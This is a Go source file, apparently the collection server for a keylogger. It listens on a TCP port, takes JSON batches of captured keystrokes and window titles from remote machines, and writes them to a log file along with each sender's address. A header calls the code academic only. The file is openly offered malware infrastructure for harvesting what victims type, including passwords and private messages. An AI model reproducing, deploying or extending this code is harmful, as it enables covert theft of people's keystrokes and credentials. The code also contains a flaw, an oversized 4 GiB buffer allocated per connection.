// STATEMENT:
// In consideration of all possible negative effects this software will bring,
// this software is developed only for academic usage.
// Any malicious usage of this software is forbidden and unrelated to the author.

package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"time"
)

const (
	Protocol = "tcp"
	Address  = "127.0.0.1:8722"

	Filename   = "keylogger.log"
	LogFormat  = "%s [%s] <%s> %s\n"
	TimeFormat = "2006.01.02 15:04:05.000"

	ExitListen = iota + 1
)

type keyLog struct {
	Time  int64  `json:"time"`
	Type  string `json:"type"`
	Title string `json:"title"`
	Value string `json:"value"`
}

// write appends data to the specified file.
func (k keyLog) write(raddr string) {
	// Format data for writing.
	// TODO: keyLog.Title unused.
	data := fmt.Sprintf(LogFormat, time.UnixMilli(k.Time).Format(TimeFormat), raddr, k.Type, k.Value)
	// Open file to append data, create if file does not exist.
	file, err := os.OpenFile(Filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, os.ModePerm)
	if err != nil {
		fmt.Printf("Failed to opean file: %s\n", err.Error())
		fmt.Printf("Failed to write:\n%s\n", data)
		return
	}
	defer file.Close()
	// Write data to the file.
	_, err = file.WriteString(data)
	if err != nil {
		fmt.Printf("Failed to write file: %s\n", err.Error())
		fmt.Printf("Data: %s\n", data)
		return
	}
}

func main() {
	// Initialise TCP listener.
	listener, err := net.Listen(Protocol, Address)
	if err != nil {
		fmt.Printf("Failed to listen: %s\n", err.Error())
		os.Exit(ExitListen)
	}
	defer listener.Close()
	fmt.Println("Start listening")
	// Loop forever to listen.
	for {
		// Wait for the next connection.
		conn, e := listener.Accept()
		if e != nil {
			fmt.Printf("Failed to accept: %s\n", e.Error())
			continue
		}
		// Initialise buffer for reading.
		buffer := make([]byte, 4294967296)
		// Read data from connection.
		n, e := conn.Read(buffer)
		if e != nil {
			fmt.Printf("Failed to read: %s\n", e.Error())
			continue
		}
		var keyLogs []keyLog
		// Unserialise buffer to keyLog slice.
		e = json.Unmarshal(buffer[:n], &keyLogs)
		if e != nil {
			fmt.Printf("Failed to unmarshal:\n%s\n", string(buffer[:n]))
			_ = conn.Close()
			continue
		}
		// Traverse and write data to file.
		for _, k := range keyLogs {
			k.write(conn.RemoteAddr().String())
		}
		_ = conn.Close()
	}
}
